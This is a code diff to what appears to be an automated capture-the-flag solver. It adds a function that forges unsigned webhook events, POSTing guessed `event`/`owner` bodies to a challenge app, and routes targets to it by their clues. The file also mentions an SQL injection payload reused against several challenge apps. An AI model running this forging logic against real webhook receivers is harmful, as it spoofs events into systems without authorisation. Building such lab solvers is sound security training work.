@@ -19,10 +19,10 @@ oracle), and never edit this shared tree from a worker's job.
 Mastery is cumulative: a target's bug class is never assumed from the challenge's
 own name. `classify_and_recover` tries each recognized class in the evidence-led
 order below (same order the restored day-19/day-20 dispatcher used, extended with
-the three classes day-21 added, the one day-22 added, the two day-24 added, and
-the three day-25 added) and returns `None` if a target's evidence does not match
-anything known yet - that is a real signal for a new class, not a bug in this
-dispatcher.
+the three classes day-21 added, the one day-22 added, the two day-24 added, the
+three day-25 added, and the one day-26 added) and returns `None` if a target's
+evidence does not match anything known yet - that is a real signal for a new
+class, not a bug in this dispatcher.
 
 `rec_sqli_group_close` promotes a payload that has now worked, verbatim and
 unmodified, against five independent live apps across three release days
@@ -498,6 +498,42 @@ def rec_graphql_field_bypass(t, clues):
     return match.group(0) if match else None
 
 
+def rec_forged_webhook_event(t, clues):
+    """`/api/clues` -> feature_route + event_type + owner_scope (+ current_role),
+    with no secondary_route/inventory_route/protected_reference/state_format_route
+    (distinguishing it from every other feature_route-driven class above). The
+    webhook receiver at feature_route has no signature/HMAC/auth check at all: a
+    GET returns `post_required`, an empty POST returns `webhook_rejected`, but it
+    blindly trusts a POST body that claims the disclosed event_type/owner_scope.
+    The exact field names are not disclosed and do not match the clue's own key
+    names - binary-searching the field space against a live target found the
+    receiver wants exactly two bare keys, `event` and `owner` (NOT
+    `event_type`/`owner_scope`, NOT `type`/`scope`), both required, both values
+    matched exactly, no nesting under `data`/`payload` needed. The check is
+    stateless - the same proof_<hex> comes back on every correct repeat - so a
+    maximal alias superset is kept as a fallback in case a future variant uses
+    different bare key names.
+    Source: day-19-trust-the-webhook (curriculum day 19, release day 26) - this
+    family's own bug (Starlette app)."""
+    feature = clues.get("feature_route")
+    event_type = clues.get("event_type")
+    owner_scope = clues.get("owner_scope")
+    if not feature or not event_type or not owner_scope:
+        return None
+    bodies = (
+        {"event": event_type, "owner": owner_scope},
+        {"event": event_type, "type": event_type, "event_type": event_type,
+         "owner_scope": owner_scope, "scope": owner_scope, "owner": owner_scope},
+    )
+    for i, body in enumerate(bodies):
+        status, resp = t.post_json(feature, body, save=f"forge_{i}")
+        text = resp if isinstance(resp, str) else json.dumps(resp)
+        match = PROOF_RE.search(text)
+        if match:
+            return match.group(0)
+    return None
+
+
 def rec_sqli_group_close(t, html):
     """A `/search`-, `/lookup`-, or `/explore`-style `?q=` form backed by an
     already-quoted LIKE clause (`WHERE (visible = 1 AND note LIKE '%<q>%')` shape).
@@ -596,6 +632,11 @@ def classify_and_recover(t, evidence=None, prompt=""):
         if clues.get("feature_route") and "preferences_route" in clues:
             evidence["classification"] = "CSRF (state-changing GET)"
             proof = rec_csrf(t, clues)
+            if proof:
+                return proof
+        if clues.get("feature_route") and clues.get("event_type") and clues.get("owner_scope"):
+            evidence["classification"] = "forged/unsigned webhook event trust"
+            proof = rec_forged_webhook_event(t, clues)
             if proof:
                 return proof
 
